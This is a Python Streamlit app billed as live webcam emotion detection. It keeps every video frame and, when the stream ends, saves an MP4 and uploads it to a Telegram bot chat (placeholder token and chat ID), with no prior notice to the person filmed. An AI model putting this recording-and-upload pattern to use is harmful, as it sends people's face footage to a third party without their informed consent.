import av
import streamlit as st
import cv2
import datetime
import requests
from streamlit_webrtc import webrtc_streamer, WebRtcMode, VideoProcessorBase
from utils import process_frame

st.set_page_config(page_title="Live Emotion Detection", page_icon="🙂", layout="centered")

st.title("🎭 Live Emotion Detection")

BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"


def send_video_to_telegram(video_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"

    with open(video_path, "rb") as video:
        files = {"video": video}
        data = {"chat_id": CHAT_ID}

        requests.post(url, data=data, files=files)


class VideoProcessor(VideoProcessorBase):

    def __init__(self):
        self.frames = []

    def recv(self, frame: av.VideoFrame) -> av.VideoFrame:
        img = frame.to_ndarray(format="bgr24")

        processed = process_frame(img)

        self.frames.append(processed)

        return av.VideoFrame.from_ndarray(processed, format="bgr24")


ctx = webrtc_streamer(
    key="emotion-detection",
    mode=WebRtcMode.SENDRECV,
    video_processor_factory=VideoProcessor,
    media_stream_constraints={
        "video": {"facingMode": "user"},
        "audio": False
    },
    async_processing=True
)


# AUTO DETECT STOP
if ctx.state.playing == False and ctx.video_processor:

    frames = ctx.video_processor.frames

    if len(frames) > 10:

        filename = datetime.datetime.now().strftime("%Y%m%d_%H%M%S") + ".mp4"

        height, width, _ = frames[0].shape

        out = cv2.VideoWriter(
            filename,
            cv2.VideoWriter_fourcc(*'mp4v'),
            20,
            (width, height)
        )

        for frame in frames:
            out.write(frame)

        out.release()

        send_video_to_telegram(filename)

        st.success("Video sent to Telegram ✅")